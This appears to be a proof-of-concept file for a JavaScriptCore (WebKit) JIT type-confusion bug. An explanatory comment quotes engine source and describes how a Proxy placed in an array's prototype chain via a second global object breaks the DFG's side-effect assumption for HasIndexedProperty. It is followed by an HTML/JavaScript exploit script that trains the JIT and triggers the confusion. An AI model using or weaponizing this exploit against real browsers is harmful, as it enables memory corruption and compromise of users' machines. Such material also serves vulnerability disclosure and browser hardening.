@@ -1,0 +1,116 @@
+<!--
+Bug:
+void JSObject::setPrototypeDirect(VM& vm, JSValue prototype)
+{
+    ASSERT(prototype);
+    if (prototype.isObject())
+        prototype.asCell()->didBecomePrototype();
+    
+    if (structure(vm)->hasMonoProto()) {
+        DeferredStructureTransitionWatchpointFire deferred(vm, structure(vm));
+        Structure* newStructure = Structure::changePrototypeTransition(vm, structure(vm), prototype, deferred);
+        setStructure(vm, newStructure);
+    } else
+        putDirect(vm, knownPolyProtoOffset, prototype);
+
+    if (!anyObjectInChainMayInterceptIndexedAccesses(vm))
+        return;
+    
+    if (mayBePrototype()) {
+        structure(vm)->globalObject()->haveABadTime(vm);
+        return;
+    }
+    
+    if (!hasIndexedProperties(indexingType()))
+        return;
+    
+    if (shouldUseSlowPut(indexingType()))
+        return;
+
+    switchToSlowPutArrayStorage(vm);
+}
+
+JavaScriptCore doesn't allow native arrays to have Proxy objects as prototypes. If we try to set the prototype of an array to a Proxy object, it will end up calling either switchToSlowPutArrayStorage or haveABadTime in the above method. switchToSlowPutArrayStorage will transition the array to a SlowPutArrayStorage array. And haveABadTime will call switchToSlowPutArrayStorage on every object in the VM on a first call. Since subsequent calls to haveABadTime won't have any effect, with two global objects we can create an array having a Proxy object in the prototype chain. 
+
+Exploit:
+    case HasIndexedProperty: {
+        ArrayMode mode = node->arrayMode();
+        
+        switch (mode.type()) {
+        case Array::Int32:
+        case Array::Double:
+        case Array::Contiguous:
+        case Array::ArrayStorage: {
+            break;
+        }
+        default: {
+            clobberWorld();
+            break;
+        }
+        }
+        setNonCellTypeForNode(node, SpecBoolean);
+        break;
+    }
+
+From: https://github.com/WebKit/webkit/blob/9ca43a5d4bd8ff63ee7293cac8748d564bd7fbbd/Source/JavaScriptCore/dfg/DFGAbstractInterpreterInlines.h#L3481
+
+The above routine is based on the assumption that if the input array is a native array, it can't intercept indexed accesses therefore it will have no side effects. But actually we can create such arrays which break that assumption making it exploitable.
+
+PoC:
+-->
+
+<body>
+<script>
+
+function opt(arr, arr2) {
+    arr[1] = 1.1;
+
+    let tmp = 0 in arr2;
+
+    arr[0] = 2.3023e-320;
+
+    return tmp;
+}
+
+function main() {
+    let o = document.body.appendChild(document.createElement('iframe')).contentWindow;
+
+    // haveABadTime
+    o.eval(`
+let p = new Proxy({}, {});
+let a = {__proto__: {}};
+a.__proto__.__proto__ = p;
+`);
+
+    let arr = [1.1, 2.2];
+    let arr2 = [1.1, 2.2];
+
+    let proto = new o.Object();
+    let handler = {};
+
+    arr2.__proto__ = proto;
+    proto.__proto__ = new Proxy({}, {
+        has() {
+            arr[0] = {};
+
+            return true;
+        }
+    });
+
+    for (let i = 0; i < 10000; i++) {
+        opt(arr, arr2);
+    }
+
+    setTimeout(() => {
+        delete arr2[0];
+
+        opt(arr, arr2);
+
+        alert(arr[0]);
+    }, 500);
+}
+
+main();
+
+</script>
+</body>
